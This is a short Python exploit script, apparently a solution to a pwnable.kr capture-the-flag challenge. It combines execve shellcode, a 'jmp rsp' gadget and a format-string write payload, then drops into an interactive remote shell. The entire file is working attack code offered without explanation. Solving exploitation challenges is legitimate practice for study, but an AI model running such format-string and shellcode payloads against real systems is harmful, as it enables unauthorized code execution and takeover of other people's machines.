from socket import *
from telnetlib import *
import struct, time

p = lambda x: struct.pack("<Q", x)
up = lambda x: struct.unpack("<Q", x)[0]

HOST = 'pwnable.kr'
PORT = 9011

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff" + \
            "\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
gadget = "\x90\xff\xe7" + "\n" # jmp *%rsp

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

payload = "%6299808x%8$ln " + "A" + p(0x602000) + "\n"
lst = [gadget, '2\n', payload, '3\n', shellcode + '\n']
time.sleep(0.3)
s.recv(1024)

for i in range(5):
    s.send(lst[i])
    time.sleep(0.3)
    s.recv(1024)
    
t = Telnet()
t.sock = s
t.interact()